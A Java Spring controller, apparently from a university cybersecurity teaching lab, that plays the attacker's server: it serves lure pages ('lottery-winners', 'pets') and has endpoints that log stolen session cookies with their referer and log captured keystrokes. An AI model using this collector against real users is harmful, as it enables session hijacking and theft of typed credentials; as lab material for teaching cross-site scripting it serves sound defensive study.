
package uk.ac.jisc.cybersec.controller;

import javax.servlet.http.HttpServletRequest;

import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.http.HttpHeaders;
import org.springframework.http.HttpStatus;
import org.springframework.http.ResponseEntity;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RequestParam;

@Controller
public class AttackerController {

    private static final Logger log = LoggerFactory.getLogger(AttackerController.class);

    @GetMapping("/lottery-winners")
    public String getPage() {
        return "lottery-winners";
    }

    @GetMapping("/pet-rescue")
    public String getPagePetRescue() {
        return "pets";
    }

    @GetMapping(value = "/sendme")
    public ResponseEntity<String> sendMe(final HttpServletRequest request,
            @RequestParam("cookie") final String cookie) {
        log.debug("Found cookie [{}]", cookie);

        final String cameFrom = request.getHeader(HttpHeaders.REFERER);

        log.debug("Cookie was sent to me from [{}]", cameFrom);

        final HttpHeaders headers = new HttpHeaders();
        headers.add("Location", "/items");
        return new ResponseEntity<>(headers, HttpStatus.FOUND);

    }

    @GetMapping(value = "/shadow")
    public ResponseEntity<Void> shadow(final HttpServletRequest request, @RequestParam("keys") final String keys) {
        log.debug("Found keypresses [{}]", keys);

        return new ResponseEntity<>(HttpStatus.OK);

    }

}
